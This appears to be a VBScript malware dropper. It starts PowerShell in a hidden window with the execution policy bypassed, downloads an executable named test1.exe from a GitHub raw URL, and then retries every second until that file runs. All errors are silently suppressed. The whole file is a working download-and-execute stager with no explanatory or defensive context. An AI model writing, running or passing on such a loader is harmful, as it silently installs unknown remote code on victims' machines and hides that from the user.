On Error Resume Next
Dim oShell

Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "powershell -windowstyle hidden -executionpolicy bypass -noninteractive ""Invoke-WebRequest -Uri 'https://github.com/Synchroxi28/psychic/raw/refs/heads/main/test1.exe' -OutFile 'test1.exe'"""

Set x = 0


Do While x = 0
	WScript.Sleep 1000
    	oShell.run "test1.exe"
	If err.Number = 0 Then
 		x = 1
	End If
	err.clear
		
Loop